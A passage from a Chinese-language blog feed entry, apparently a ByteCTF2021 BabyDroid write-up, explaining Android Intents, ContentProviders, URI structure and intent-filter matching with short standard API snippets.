class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他的一些知识"><a href="#其他的一些知识" class="headerlink" title="其他的一些知识"></a>其他的一些知识</h2><p><a href="https://bbs.kanxue.com/thread-269447-1.htm">原创]Android APP漏洞之战（4）——Content Provider漏洞详解-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><p>Android APP四大组件中Content Provider</p><p><strong>Intent 是 Android 的“跨组件通信消息”。</strong></p><p>它不存数据本身，而是<strong>描述一次动作&#x2F;请求</strong>：</p><ul><li>打开某个 Activity</li><li>发送一个广播</li><li>请求另一个 App 帮我做事</li><li>附带一些参数（extras）</li></ul><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">startActivity(intent);      // 启动界面</span><br><span class="line">sendBroadcast(intent);      // 广播消息</span><br><span class="line">startService(intent);       // 启动服务</span><br></pre></td></tr></table></figure><p><strong>ContentProvider 是 Android 的“标准化数据访问接口”。</strong></p><p>它用来：</p><ul><li>向别的 App 提供数据</li><li>控制访问权限</li><li>隔离真实存储细节</li></ul><p>数据要给别人用，但不能把整个沙箱打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cursor c = getContentResolver().query(uri, ...);</span><br><span class="line">InputStream in = getContentResolver().openInputStream(uri);</span><br></pre></td></tr></table></figure><p>App A 想让 App B 选一张图片</p><p>App B 有 ContentProvider（相册）</p><p>App B 用 Intent 返回：</p><ul><li>一个 <code>content://...</code> URI</li><li>外加 <code>FLAG_GRANT_READ_URI_PERMISSION</code></li></ul><p>App A 用 ContentResolver 读数据</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260116091333530.png" alt="image-20260116091333530"></p><p>我们创建一个Content Provider，其他的应用可以通过使用ContentResolver来访问ContentProvider提供的数据，而ContentResolver通过uri来定位自己要访问的数据，所以我们要先了解URI</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260116091412608.png" alt="image-20260116091412608"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://authority/path?query#fragment</span><br></pre></td></tr></table></figure><table><thead><tr><th>部分</th><th>含义</th><th>是否必需</th></tr></thead><tbody><tr><td>scheme</td><td>使用什么协议&#x2F;规则</td><td>✅</td></tr><tr><td>authority</td><td>由谁来管</td><td>视 scheme</td></tr><tr><td>path</td><td>具体资源路径</td><td>视情况</td></tr><tr><td>query</td><td>参数</td><td>❌</td></tr><tr><td>fragment</td><td>片段</td><td>❌</td></tr></tbody></table><p>官方文档：<a href="https://developer.android.google.cn/guide/topics/providers/content-provider-basics.html?hl=zh-cn#java">Content provider 基础知识  | App data and files  | Android Developers</a></p><p><strong>Intent的完整结构</strong></p><p><strong>Action</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setAction(&quot;android.intent.action.VIEW&quot;);</span><br></pre></td></tr></table></figure><p>本质：一个字符串</p><p>含义：描述要执行的“动作类型”</p><p><strong>Data（URI + MIME type）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setData(Uri.parse(&quot;content://...&quot;));</span><br></pre></td></tr></table></figure><p>类型：Uri</p><p>含义：操作的对象</p><p><strong>Category</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br></pre></td></tr></table></figure><p>多用于隐式 Intent</p><p>用来进一步筛选可匹配的组件</p><p>例如：</p><p>CATEGORY_LAUNCHER</p><p>CATEGORY_DEFAULT</p><p><strong>Component（显式目标）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setClassName(pkg, cls);</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setComponent(new ComponentName(pkg, cls));</span><br></pre></td></tr></table></figure><p>含义：</p><p>直接指定目标 Activity &#x2F; Service &#x2F; Receiver</p><p>一旦设置了 Component：</p><p>Action &#x2F; Category &#x2F; Data 的匹配就不重要了</p><p>系统不会再做 intent-filter 匹配</p><p><strong>Extras（Bundle）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.putExtra(&quot;key&quot;, value);</span><br></pre></td></tr></table></figure><p><strong>Flags</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br></pre></td></tr></table></figure><p>Flags 会影响：</p><p>Activity 启动栈</p><p>权限授予（非常关键）</p><p>任务行为</p><p><strong>intent-filter 匹配</strong> &#x3D;Android 在“你没指定要启动谁”的情况下，帮你从系统里找一个“愿意接这个 Intent 的组件”。</p><p><code>intent-filter</code> 写在 <strong>AndroidManifest.xml</strong> 里，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.Vulnerable&quot;&gt;</span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=&quot;com.bytectf.TEST&quot;/&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure><p>它的意思是：</p><blockquote><p><strong>如果有 Intent 的 action 是 <code>com.bytectf.TEST</code>，</strong></p><p><strong>系统可以把它交给我处理。”</strong></p></blockquote><p>如果 <strong>没有 setClass &#x2F; setComponent</strong>，系统会：</p><ol><li>看 intent 里有什么：<ul><li>action</li><li>data (URI &#x2F; MIME)</li><li>category</li></ul></li><li>扫描所有已安装 App 的 manifest</li><li>找 <code>&lt;intent-filter&gt;</code> 满足以下规则的组件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent setClassName(String packageName, String className)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-BabyDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-BabyDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 BabyDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021 BabyD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
</feed>
